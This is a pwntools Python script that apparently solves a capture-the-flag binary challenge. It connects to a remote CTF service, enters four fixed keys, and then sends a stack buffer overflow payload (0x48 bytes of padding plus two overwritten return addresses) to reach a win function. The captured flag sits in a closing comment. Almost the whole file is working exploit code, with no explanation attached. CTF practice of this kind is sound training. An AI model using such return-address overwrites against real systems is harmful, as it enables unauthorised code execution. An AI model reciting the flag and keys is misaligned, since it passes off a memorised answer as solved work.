from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = remote('treasure-hunt.ctf.pearlctf.in', 30008)

p.sendlineafter(b'Enter the mystery key to proceed: ', b'whisp3ring_w00ds')
p.sendlineafter(b'Enter the mystery key to proceed: ', b'sc0rching_dunes')
p.sendlineafter(b'Enter the mystery key to proceed: ', b'eldorian_ech0')
p.sendlineafter(b'Enter the mystery key to proceed: ', b'shadow_4byss')

p.recvuntil(b'You are worthy of the final treasure, enter the final key for the win:- ')
p.sendline(b'A'*0x48+p64(0x40126c)+p64(0x401207))

p.interactive()

# pearl{k33p_0n_r3turning_l0l}